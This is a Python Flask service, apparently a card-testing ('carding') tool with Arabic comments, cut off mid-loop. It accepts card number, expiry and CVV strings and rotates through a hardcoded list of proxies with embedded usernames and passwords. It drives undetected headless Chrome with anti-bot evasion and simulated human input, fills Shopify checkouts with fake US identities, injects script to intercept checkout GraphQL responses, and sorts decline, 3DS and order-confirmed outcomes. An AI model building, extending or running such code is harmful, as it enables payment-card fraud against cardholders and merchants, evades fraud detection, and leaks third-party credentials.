# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية + بروكسيات متعددة
import time
import re
import json
import requests
import os
import subprocess
from urllib.parse import urljoin
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from flask import Flask, request, jsonify
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import random

app = Flask(__name__)

# ==================== إعدادات الأداء ====================
MAX_WORKERS = 5
REQUEST_TIMEOUT = 120
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

active_tasks = {}
active_tasks_lock = threading.Lock()

# ==================== قائمة البروكسيات ====================
PROXY_LIST = [
    {"host": "px440401.pointtoserver.com", "port": "10780", "user": "purevpn0s8732217", "pass": "i67s60ep"},
    {"host": "192.144.26.139", "port": "8800", "user": "207273", "pass": "YXn4KChV"},
    {"host": "177.234.142.34", "port": "8800", "user": "207273", "pass": "YXn4KChV"},
    {"host": "192.144.26.7", "port": "8800", "user": "207273", "pass": "YXn4KChV"},
    {"host": "192.144.26.182", "port": "8800", "user": "207273", "pass": "YXn4KChV"},
    {"host": "177.234.142.110", "port": "8800", "user": "207273", "pass": "YXn4KChV"},
    {"host": "38.154.127.188", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "38.154.127.189", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "192.186.190.226", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "38.154.127.233", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "192.186.190.229", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "192.186.190.236", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "192.186.190.252", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "38.154.127.208", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "38.154.127.214", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "192.186.190.225", "port": "8800", "user": "207274", "pass": "bv5KcH7JVR"},
    {"host": "107.175.80.4", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.92.196", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.92.245", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.92.197", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.80.43", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.80.2", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.80.1", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.92.244", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.80.54", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "107.175.92.242", "port": "8800", "user": "207276", "pass": "gFuY3QqABfF"},
    {"host": "195.242.209.13", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "195.242.209.223", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "167.160.171.193", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "167.160.171.51", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "195.242.209.205", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "167.160.171.139", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "195.242.209.142", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "167.160.171.234", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "195.242.209.18", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
    {"host": "167.160.171.116", "port": "8800", "user": "207295", "pass": "hwst5RWh4"},
]

proxy_counter = 0
proxy_lock = threading.Lock()

def get_next_proxy():
    global proxy_counter
    with proxy_lock:
        proxy = PROXY_LIST[proxy_counter % len(PROXY_LIST)]
        proxy_counter += 1
        return proxy

def get_chrome_major_version():
    try:
        result = subprocess.run(['google-chrome', '--version'], capture_output=True, text=True)
        version_str = result.stdout.strip()
        match = re.search(r'(\d+)\.', version_str)
        if match:
            return int(match.group(1))
    except:
        pass
    try:
        result = subprocess.run(['chromium', '--version'], capture_output=True, text=True)
        version_str = result.stdout.strip()
        match = re.search(r'(\d+)\.', version_str)
        if match:
            return int(match.group(1))
    except:
        pass
    try:
        result = subprocess.run(['chromium-browser', '--version'], capture_output=True, text=True)
        version_str = result.stdout.strip()
        match = re.search(r'(\d+)\.', version_str)
        if match:
            return int(match.group(1))
    except:
        pass
    return None

def create_driver_with_proxy(proxy_dict, task_id=None):
    proxy_host = proxy_dict['host']
    proxy_port = proxy_dict['port']
    proxy_user = proxy_dict['user']
    proxy_pass = proxy_dict['pass']
    
    options = uc.ChromeOptions()
    options.add_argument(f'--proxy-server=http://{proxy_host}:{proxy_port}')
    options.add_argument('--headless=new')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--disable-web-security')
    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
    options.add_argument('--disable-popup-blocking')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-extensions')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--start-maximized')
    options.add_argument('--disable-background-networking')
    options.add_argument('--disable-sync')
    options.add_argument('--disable-translate')
    options.add_argument('--disable-default-apps')
    options.add_argument('--mute-audio')
    options.add_argument('--no-first-run')
    options.add_argument('--no-default-browser-check')
    options.add_argument('--single-process')
    options.add_argument('--disable-ipc-flooding-protection')
    options.add_argument('--memory-pressure-off')
    options.add_argument('--disable-component-extensions-with-background-pages')
    options.add_argument('--disable-client-side-phishing-detection')
    options.add_argument('--disable-hang-monitor')
    options.add_argument('--disable-prompt-on-repost')
    options.add_argument('--disable-renderer-backgrounding')
    options.add_argument('--disable-backgrounding-occluded-windows')
    options.add_argument('--disable-field-trial-config')
    options.add_argument('--enable-features=NetworkService,NetworkServiceInProcess')
    options.add_argument('--disable-features=Translate,BackForwardCache')
    
    chrome_version = get_chrome_major_version()
    
    if chrome_version:
        logger.info(f"[{task_id}] Chrome {chrome_version} | Proxy: {proxy_host}:{proxy_port}")
        driver = uc.Chrome(options=options, version_main=chrome_version, use_subprocess=True)
    else:
        logger.info(f"[{task_id}] Chrome auto | Proxy: {proxy_host}:{proxy_port}")
        driver = uc.Chrome(options=options, use_subprocess=True)
    
    try:
        driver.execute_cdp_cmd('Network.enable', {})
    except:
        pass
    
    return driver

# ==================== نظام توليد عناوين أمريكية متطابقة ====================
MATCHED_ADDRESSES = [
    {"first_name": "James", "last_name": "Smith", "full_name": "James Smith", "address1": "1200 Main St", "city": "New York", "state": "New York", "zip": "10001", "phone": "2125550101", "email_domain": "gmail.com"},
    {"first_name": "Mary", "last_name": "Johnson", "full_name": "Mary Johnson", "address1": "2500 Oak Ave", "city": "Los Angeles", "state": "California", "zip": "90001", "phone": "2135550202", "email_domain": "yahoo.com"},
    {"first_name": "Robert", "last_name": "Williams", "full_name": "Robert Williams", "address1": "3800 Maple Dr", "city": "Chicago", "state": "Illinois", "zip": "60601", "phone": "3125550303", "email_domain": "outlook.com"},
    {"first_name": "Patricia", "last_name": "Brown", "full_name": "Patricia Brown", "address1": "4500 Cedar Ln", "city": "Houston", "state": "Texas", "zip": "77001", "phone": "7135550404", "email_domain": "hotmail.com"},
    {"first_name": "John", "last_name": "Jones", "full_name": "John Jones", "address1": "5200 Elm St", "city": "Phoenix", "state": "Arizona", "zip": "85001", "phone": "6025550505", "email_domain": "protonmail.com"},
    {"first_name": "Jennifer", "last_name": "Garcia", "full_name": "Jennifer Garcia", "address1": "6800 Washington Ave", "city": "Philadelphia", "state": "Pennsylvania", "zip": "19101", "phone": "2155550606", "email_domain": "icloud.com"},
    {"first_name": "Michael", "last_name": "Miller", "full_name": "Michael Miller", "address1": "7500 Park Ave", "city": "San Antonio", "state": "Texas", "zip": "78201", "phone": "2105550707", "email_domain": "mail.com"},
    {"first_name": "Linda", "last_name": "Davis", "full_name": "Linda Davis", "address1": "8100 Lake Dr", "city": "San Diego", "state": "California", "zip": "92101", "phone": "6195550808", "email_domain": "aol.com"},
    {"first_name": "William", "last_name": "Rodriguez", "full_name": "William Rodriguez", "address1": "9300 Hill St", "city": "Dallas", "state": "Texas", "zip": "75201", "phone": "2145550909", "email_domain": "yandex.com"},
    {"first_name": "Elizabeth", "last_name": "Martinez", "full_name": "Elizabeth Martinez", "address1": "10400 Pine St", "city": "Austin", "state": "Texas", "zip": "73301", "phone": "5125551010", "email_domain": "zoho.com"},
    {"first_name": "David", "last_name": "Hernandez", "full_name": "David Hernandez", "address1": "11500 Church St", "city": "Jacksonville", "state": "Florida", "zip": "32099", "phone": "9045551111", "email_domain": "fastmail.com"},
    {"first_name": "Barbara", "last_name": "Lopez", "full_name": "Barbara Lopez", "address1": "12800 Market St", "city": "Fort Worth", "state": "Texas", "zip": "76101", "phone": "8175551212", "email_domain": "tutanota.com"},
    {"first_name": "Richard", "last_name": "Wilson", "full_name": "Richard Wilson", "address1": "13900 Bridge St", "city": "Columbus", "state": "Ohio", "zip": "43004", "phone": "6145551313", "email_domain": "gmail.com"},
    {"first_name": "Susan", "last_name": "Anderson", "full_name": "Susan Anderson", "address1": "15000 River Rd", "city": "Charlotte", "state": "North Carolina", "zip": "28201", "phone": "7045551414", "email_domain": "yahoo.com"},
    {"first_name": "Joseph", "last_name": "Thomas", "full_name": "Joseph Thomas", "address1": "16200 Forest Ave", "city": "San Francisco", "state": "California", "zip": "94101", "phone": "4155551515", "email_domain": "outlook.com"},
    {"first_name": "Jessica", "last_name": "Taylor", "full_name": "Jessica Taylor", "address1": "17500 Valley Rd", "city": "Indianapolis", "state": "Indiana", "zip": "46201", "phone": "3175551616", "email_domain": "hotmail.com"},
    {"first_name": "Thomas", "last_name": "Moore", "full_name": "Thomas Moore", "address1": "18800 Mountain Ave", "city": "Seattle", "state": "Washington", "zip": "98101", "phone": "2065551717", "email_domain": "protonmail.com"},
    {"first_name": "Sarah", "last_name": "Jackson", "full_name": "Sarah Jackson", "address1": "19900 Sunset Blvd", "city": "Denver", "state": "Colorado", "zip": "80201", "phone": "3035551818", "email_domain": "icloud.com"},
    {"first_name": "Charles", "last_name": "Martin", "full_name": "Charles Martin", "address1": "21200 Highland Ave", "city": "Washington", "state": "District of Columbia", "zip": "20001", "phone": "2025551919", "email_domain": "mail.com"},
    {"first_name": "Karen", "last_name": "Lee", "full_name": "Karen Lee", "address1": "22500 Grove St", "city": "Boston", "state": "Massachusetts", "zip": "02101", "phone": "6175552020", "email_domain": "aol.com"},
]

def generate_matched_shipping_data():
    address = random.choice(MATCHED_ADDRESSES).copy()
    username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
    address["email"] = f"{username}@{address['email_domain']}"
    return address

def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
    valid_codes = []
    for code in all_codes:
        is_excluded = False
        for excluded in excluded_codes:
            if excluded in code:
                is_excluded = True
                break
        if not is_excluded:
            valid_codes.append(code)
    
    underscore_codes = [code for code in valid_codes if '_' in code]
    
    unwanted_patterns = [
        'Free_Postal_Shipping', 'UPS_', 'Economy_', 'First_', 'Standard_', 'Priority_',
        'GroundAdvantage_', 'MediaMail_', 'Flat_', 'Shipping_', 'Express_',
        'PrivacyBannerSettingsBulletPoints_', 'UiExtension_', 'fedex_ground_economy_',
        'CAMP_', 'by-items_', 'DELIVERY_', 'PAYMENTS_', 'BUYER_', 'REQUIRED_', 'WAITING_'
    ]
    
    filtered_underscore_codes = []
    for code in underscore_codes:
        is_unwanted = False
        for pattern in unwanted_patterns:
            if pattern in code:
                is_unwanted = True
                break
        if not is_unwanted:
            filtered_underscore_codes.append(code)
    
    if filtered_underscore_codes:
        return filtered_underscore_codes[0], None
    
    if all_typenames:
        typename_underscore = [t for t in all_typenames if '_' in t]
        filtered_typename_underscore = []
        for t in typename_underscore:
            is_unwanted = False
            for pattern in unwanted_patterns:
                if pattern in t:
                    is_unwanted = True
                    break
            if not is_unwanted:
                filtered_typename_underscore.append(t)
        
        if filtered_typename_underscore:
            return filtered_typename_underscore[0], filtered_typename_underscore[0]
    
    if valid_codes:
        return valid_codes[0], None
    
    if all_typenames:
        return all_typenames[0], all_typenames[0]
    
    return None, None

def human_type(element, text, driver):
    try:
        element.click()
        time.sleep(random.uniform(0.2, 0.5))
        element.clear()
        time.sleep(random.uniform(0.1, 0.3))
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))
        time.sleep(random.uniform(0.2, 0.5))
    except:
        try:
            element.clear()
            element.send_keys(text)
        except:
            pass

def human_click(driver, element):
    try:
        actions = ActionChains(driver)
        actions.move_to_element(element)
        actions.pause(random.uniform(0.2, 0.6))
        actions.click()
        actions.perform()
    except:
        try:
            driver.execute_script("arguments[0].click();", element)
        except:
            pass

def random_scroll(driver):
    try:
        total_height = driver.execute_script("return document.body.scrollHeight")
        for _ in range(random.randint(2, 4)):
            scroll_to = random.randint(100, max(200, total_height - 100))
            driver.execute_script(f"window.scrollTo({{top: {scroll_to}, behavior: 'smooth'}});")
            time.sleep(random.uniform(0.5, 1.5))
    except:
        pass

def ff(ccx, site, task_id=None):
    
    if task_id:
        with active_tasks_lock:
            active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
        logger.info(f"[{task_id}] Started task: {site}")
    
    shipping_data = generate_matched_shipping_data()
    
    parts = ccx.split('|')
    if len(parts) != 4:
        return {"success": False, "code": None, "error": "Invalid card format", "task_id": task_id}
    
    card_data = {
        "number": parts[0].strip(),
        "expiry": f"{parts[1].strip()}/{parts[2].strip()[-2:]}",
        "cvv": parts[3].strip(),
        "name": shipping_data["full_name"]
    }
    
    found_code = None
    found_typename = None
    total_amount = "$1.00"
    base_url = site.rstrip('/')
    response_result = None
    is_3ds = False
    order_confirmed = False
    checkout_url = None
    final_url = None
    order_number = None
    
    # اختيار بروكسيين
    proxy_for_request = get_next_proxy()
    proxy_for_browser = get_next_proxy()
    
    # ==================== 1. جلب رابط الدفع ====================
    try:
        proxy_url = f"http://{proxy_for_request['user']}:{proxy_for_request['pass']}@{proxy_for_request['host']}:{proxy_for_request['port']}"
        proxies = {"http": proxy_url, "https": proxy_url}
        
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
        
        digital_keywords = ['worry-free', 'protection', 'insurance', 'warranty', 'digital', 'download', 'ebook', 'pdf', 'gift card', 'membership', 'subscription', 'service', 'guarantee', 'support']
        
        logger.info(f"[{task_id}] Request proxy: {proxy_for_request['host']}:{proxy_for_request['port']}")
        
        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=15)
        if r.status_code != 200:
            return {"success": False, "code": None, "error": "Failed to fetch products", "task_id": task_id}
        
        products_data = r.json()
        shippable_products = []
        
        for p in products_data.get('products', []):
            title = p.get('title', '').lower()
            product_type = p.get('product_type', '').lower()
            vendor = p.get('vendor', '').lower()
            
            is_digital = False
            for keyword in digital_keywords:
                if keyword in title or keyword in product_type or keyword in vendor:
                    is_digital = True
                    break
            
            if is_digital:
                continue
            
            for v in p.get('variants', []):
                price = float(v.get('price', 0))
                available = v.get('available', True)
                if price > 0 and available and price >= 1.0:
                    shippable_products.append({'title': p.get('title'), 'price': price, 'variant_id': v.get('id'), 'handle': p.get('handle')})
        
        if not shippable_products:
            return {"success": False, "code": None, "error": "No shippable product", "task_id": task_id}
        
        cheapest = min(shippable_products, key=lambda x: x['price'])
        variant_id = cheapest['variant_id']
        total_amount = f"${cheapest['price']:.2f}"
        
        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=15)
        if resp.status_code != 200:
            return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
        
        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=15)
        checkout_url = response.url
        
    except Exception as e:
        return {"success": False, "code": None, "error": str(e), "task_id": task_id}
    
    # ==================== 2. تشغيل المتصفح ====================
    driver = None
    try:
        logger.info(f"[{task_id}] Browser proxy: {proxy_for_browser['host']}:{proxy_for_browser['port']}")
        driver = create_driver_with_proxy(proxy_for_browser, task_id)
        
        wait = WebDriverWait(driver, 20)
        driver.set_page_load_timeout(30)
        
        driver.get(site)
        time.sleep(random.uniform(2, 4))
        random_scroll(driver)
        time.sleep(random.uniform(1, 2))
        
        driver.get(checkout_url)
        time.sleep(random.uniform(2, 3))
        random_scroll(driver)
        time.sleep(random.uniform(0.5, 1))
        
        # ==================== 3. تعبئة الشحن ====================
        try:
            email_field = None
            email_selectors = [
                (By.ID, "email"),
                (By.NAME, "email"),
                (By.CSS_SELECTOR, "#email"),
                (By.CSS_SELECTOR, "[name='email']"),
                (By.CSS_SELECTOR, "input[type='email']"),
                (By.CSS_SELECTOR, "[placeholder*='email' i]"),
            ]
            
            for by, selector in email_selectors:
                try:
                    email_field = wait.until(EC.presence_of_element_located((by, selector)))
                    if email_field and email_field.is_displayed():
                        logger.info(f"[{task_id}] Email field found: {by}={selector}")
                        break
                except:
                    continue
            
            if not email_field:
                logger.error(f"[{task_id}] Email field not found")
                return {"success": False, "code": None, "error": "Email field not found on page", "task_id": task_id}
            
            human_click(driver, email_field)
            human_type(email_field, shipping_data["email"], driver)
            time.sleep(random.uniform(1.5, 2.5))
            
            try:
                country_select = driver.find_element(By.NAME, "countryCode")
                if country_select.get_attribute('value') != "US":
                    Select(country_select).select_by_value("US")
                    time.sleep(random.uniform(0.5, 1))
            except:
                pass
            
            fields = {
                "firstName": shipping_data["first_name"],
                "lastName": shipping_data["last_name"],
                "address1": shipping_data["address1"],
                "city": shipping_data["city"],
                "postalCode": shipping_data["zip"],
                "phone": shipping_data["phone"]
            }
            
            for field_name, value in fields.items():
                try:
                    element = None
                    field_selectors = [
                        (By.NAME, field_name),
                        (By.CSS_SELECTOR, f"[name='{field_name}']"),
                        (By.ID, field_name),
                    ]
                    for by, sel in field_selectors:
                        try:
                            element = wait.until(EC.presence_of_element_located((by, sel)))
                            if element and element.is_displayed():
                                break
                        except:
                            continue
                    
                    if element:
                        human_click(driver, element)
                        human_type(element, value, driver)
                        time.sleep(random.uniform(0.5, 1.5))
                except:
                    pass
            
            try:
                state_select = Select(driver.find_element(By.NAME, "zone"))
                state_select.select_by_visible_text(shipping_data["state"])
                time.sleep(random.uniform(0.3, 0.7))
            except:
                try:
                    state_input = driver.find_element(By.NAME, "zone")
                    human_click(driver, state_input)
                    human_type(state_input, shipping_data["state"], driver)
                    state_input.send_keys(Keys.ENTER)
                except:
                    pass
            
            time.sleep(random.uniform(1, 2))
            random_scroll(driver)
            time.sleep(random.uniform(0.5, 1))
            
            continue_btn = None
            btn_selectors = [
                (By.CSS_SELECTOR, "button[type='submit']"),
                (By.XPATH, "//button[contains(text(), 'Continue')]"),
                (By.XPATH, "//button[contains(text(), 'Continue to shipping')]"),
                (By.XPATH, "//button[contains(text(), 'Continue to payment')]"),
            ]
            
            for by, sel in btn_selectors:
                try:
                    continue_btn = wait.until(EC.element_to_be_clickable((by, sel)))
                    if continue_btn and continue_btn.is_displayed():
                        break
                except:
                    continue
            
            if continue_btn:
                human_click(driver, continue_btn)
                time.sleep(random.uniform(3, 5))
            else:
                logger.error(f"[{task_id}] Continue button not found")
                return {"success": False, "code": None, "error": "Continue button not found", "task_id": task_id}
            
        except Exception as e:
            logger.error(f"[{task_id}] Shipping fill error: {str(e)}")
            return {"success": False, "code": None, "error": f"Shipping fill failed: {str(e)}", "task_id": task_id}
        
        # ==================== 4. تعبئة الدفع ====================
        try:
            driver.switch_to.default_content()
            time.sleep(random.uniform(1, 2))
            random_scroll(driver)
            time.sleep(random.uniform(0.5, 1))
            
            iframes = driver.find_elements(By.TAG_NAME, 'iframe')
            
            card_filled = False
            expiry_filled = False
            cvv_filled = False
            name_filled = False
            
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    inputs = driver.find_elements(By.TAG_NAME, 'input')
                    
                    for input_elem in inputs:
                        data_field = input_elem.get_attribute('data-field') or ''
                        placeholder = (input_elem.get_attribute('placeholder') or '').lower()
                        autocomplete = (input_elem.get_attribute('autocomplete') or '').lower()
                        input_id = (input_elem.get_attribute('id') or '').lower()
                        name_attr = (input_elem.get_attribute('name') or '').lower()
                        
                        if not card_filled and ('number' in data_field or 'card number' in placeholder or 'cc-number' in autocomplete or 'cardnumber' in name_attr or 'number' in input_id):
                            human_click(driver, input_elem)
                            driver.execute_script("arguments[0].value = ''; arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input', {bubbles: true})); arguments[0].dispatchEvent(new Event('change', {bubbles: true})); arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));", input_elem, card_data["number"])
                            card_filled = True
                            time.sleep(random.uniform(0.5, 1))
                        
                        elif not expiry_filled and ('expiry' in data_field or 'expiry' in placeholder or 'cc-exp' in autocomplete or 'exp-date' in name_attr or 'expiry' in input_id):
                            human_click(driver, input_elem)
                            driver.execute_script("arguments[0].value = ''; arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input', {bubbles: true})); arguments[0].dispatchEvent(new Event('change', {bubbles: true})); arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));", input_elem, card_data["expiry"])
                            expiry_filled = True
                            time.sleep(random.uniform(0.5, 1))
                        
                        elif not cvv_filled and ('cvv' in data_field or 'cvv' in placeholder or 'cc-csc' in autocomplete or 'cvc' in input_id or 'cvv' in input_id):
                            human_click(driver, input_elem)
                            driver.execute_script("arguments[0].value = ''; arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input', {bubbles: true})); arguments[0].dispatchEvent(new Event('change', {bubbles: true})); arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));", input_elem, card_data["cvv"])
                            cvv_filled = True
                            time.sleep(random.uniform(0.5, 1))
                        
                        elif not name_filled and ('name' in data_field or 'name' in placeholder or 'cc-name' in autocomplete or 'cardholder' in name_attr):
                            human_click(driver, input_elem)
                            driver.execute_script("arguments[0].value = ''; arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input', {bubbles: true})); arguments[0].dispatchEvent(new Event('change', {bubbles: true})); arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));", input_elem, card_data["name"])
                            name_filled = True
                            time.sleep(random.uniform(0.5, 1))
                    
                    driver.switch_to.default_content()
                    
                    if card_filled and expiry_filled and cvv_filled and name_filled:
                        break
                        
                except:
                    driver.switch_to.default_content()
                    continue
            
            if not (card_filled and expiry_filled and cvv_filled and name_filled):
                return {"success": False, "code": None, "error": "Payment fill failed", "task_id": task_id}
            
        except Exception as e:
            logger.error(f"[{task_id}] Payment fill error: {str(e)}")
            return {"success": False, "code": None, "error": "Payment error", "task_id": task_id}
        
        # ==================== 5. اعتراض GraphQL ====================
        try:
            script = """
            window.graphqlResponses = [];
            window.allResponses = [];
            window.pollForReceiptResponses = [];
            
            var originalFetch = window.fetch;
            window.fetch = function(url, options) {
                return originalFetch.apply(this, arguments).then(function(response) {
                    var clone = response.clone();
                    var responseUrl = url;
                    var requestBody = null;
                    if (options && options.body) { try { requestBody = options.body; } catch(e) {} }
                    clone.text().then(function(text) {
                        var data = {url: responseUrl, body: text, requestBody: requestBody, timestamp: new Date().toISOString()};
                        window.allResponses.push(data);
                        if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
                            var isProposal = false;
                            if (requestBody) { try { var p = JSON.parse(requestBody); if (p.operationName === 'Proposal') isProposal = true; } catch(e) {} }
                            if (!isProposal) {
                                window.graphqlResponses.push(data);
                                if (requestBody) { try { var p2 = JSON.parse(requestBody); if (p2.operationName === 'PollForReceipt') window.pollForReceiptResponses.push(data); } catch(e) {} }
                            }
                        }
                    });
                    return response;
                });
            };
            
            var originalXHROpen = XMLHttpRequest.prototype.open;
            var originalXHRSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.open = function(method, url) { this._url = url; return originalXHROpen.apply(this, arguments); };
            XMLHttpRequest.prototype.send = function(body) {
                var self = this;
                this.addEventListener('load', function() {
                    try {
                        var data = {url: self._url, body: self.responseText, requestBody: body, timestamp: new Date().toISOString()};
                        window.allResponses.push(data);
                        if (self._url && self._url.includes('/checkouts/internal/graphql/persisted')) {
                            var isProposal = false;
                            if (body) { try { var p = JSON.parse(body); if (p.operationName === 'Proposal') isProposal = true; } catch(e) {} }
                            if (!isProposal) {
                                window.graphqlResponses.push(data);
                                if (body) { try { var p2 = JSON.parse(body); if (p2.operationName === 'PollForReceipt') window.pollForReceiptResponses.push(data); } catch(e) {} }
                            }
                        }
                    } catch(e) {}
                });
                return originalXHRSend.apply(this, arguments);
            };
            """
            driver.execute_script(script)
            time.sleep(random.uniform(0.5, 1))
            
            # ==================== 6. الضغط على Pay ====================
            driver.switch_to.default_content()
            time.sleep(random.uniform(1, 2))
            random_scroll(driver)
            time.sleep(random.uniform(0.5, 1))
            
            pay_button = None
            pay_selectors = [
                (By.XPATH, "//button[contains(text(), 'Pay now')]"),
                (By.XPATH, "//button[contains(text(), 'Pay') and not(contains(text(), 'Pal'))]"),
                (By.XPATH, "//button[contains(text(), 'Complete order')]"),
                (By.XPATH, "//button[contains(text(), 'Place order')]"),
                (By.CSS_SELECTOR, "button[type='submit']"),
            ]
            
            for by, sel in pay_selectors:
                try:
                    buttons = driver.find_elements(by, sel)
                    for button in buttons:
                        if button.is_displayed() and button.is_enabled():
                            pay_button = button
                            break
                    if pay_button:
                        break
                except:
                    continue
            
            if pay_button:
                human_click(driver, pay_button)
                logger.info(f"[{task_id}] Pay button clicked")
            else:
                driver.execute_script("""
                    var buttons = document.querySelectorAll('button, input[type="submit"]');
                    for (var i = 0; i < buttons.length; i++) {
                        var text = (buttons[i].textContent || buttons[i].value || '').toLowerCase();
                        if (text.includes('pay') || text.includes('complete') || text.includes('place') || text.includes('order')) {
                            buttons[i].click();
                            return;
                        }
                    }
                """)
                logger.info(f"[{task_id}] Fallback pay button executed")
            
            # ==================== 7. استخراج الكود ====================
            found_code = None
            found_typename = None
            all_codes = []
            all_typenames = []
            is_3ds = False
            order_confirmed = False
            order_number = None
            
            excluded_codes = [
                'REQUIRED_ARTIFACTS_UNAVAILABLE', 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                'BUYER_IDENTITY_MISSING_CONTACT_METHOD', 'PAYMENTS_ADDRESS1_REQUIRED',
                'PAYMENTS_LAST_NAME_REQUIRED', 'PAYMENTS_FIRST_NAME_REQUIRED',
                'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 'PAYMENTS_POSTAL_CODE_REQUIRED',
                'DELIVERY_ZONE_REQUIRED_FOR_COUNTRY', 'DELIVERY_POSTAL_CODE_REQUIRED',
                'PAYMENTS_CITY_REQUIRED', 'WAITING_PENDING_TERMS', 'Free Postal Shipping',
                'UPS', 'DELIVERY_PHONE_NUMBER_REQUIRED', 'Economy',
                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 'First', 'by-items',
                'Standard', 'Priority', 'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE',
                'GroundAdvantage', 'MediaMail'
            ]
            
            for attempt in range(15):
                time.sleep(random.uniform(1.5, 2.5))
                
                poll_responses = driver.execute_script("return window.pollForReceiptResponses || [];")
                graphql_responses = driver.execute_script("return window.graphqlResponses || [];")
                current_url = driver.current_url
                final_url = current_url
                
                if '/thank_you' in current_url:
                    order_confirmed = True
                    found_code = 'ORDER_CONFIRMED'
                    response_result = 'Order confirmed'
                    order_match = re.search(r'order_([A-Z0-9]+)', current_url, re.IGNORECASE)
                    if order_match:
                        order_number = order_match.group(1)
                    break
                
                try:
                    page_source = driver.page_source
                    if 'thank you for your order' in page_source.lower() or 'your order is confirmed' in page_source.lower():
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed'
                        order_match = re.search(r'Order #?([A-Z0-9]+)', page_source, re.IGNORECASE)
                        if order_match:
                            order_number = order_match.group(1)
                        break
                except:
                    pass
                
                for resp in poll_responses + graphql_responses:
                    body = resp.get('body', '')
                    if not body:
                        continue
                    
                    if 'thank_you' in body.lower() or 'order confirmed' in body.lower():
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        break
                    
                    if 'CompletePaymentChallenge' in body:
                        is_3ds = True
                        found_code = '3DS_REQUIRED'
                        found_typename = 'CompletePaymentChallenge'
                        break
                    
                    pattern = r'"code"\s*:\s*"([^"]+)"'
                    for code in re.findall(pattern, body, re.IGNORECASE):
                        if len(code) > 3 and len(code) < 80 and ' ' not in code and code not in all_codes:
                            all_codes.append(code)
                    
                    if '__typename' in body:
                        for typename in re.findall(r'"__typename"\s*:\s*"([^"]+)"', body, re.IGNORECASE):
                            if typename not in ['Query', 'Mutation', 'Subscription'] and typename not in all_typenames:
                                all_typenames.append(typename)
                    
                    body_upper = body.upper()
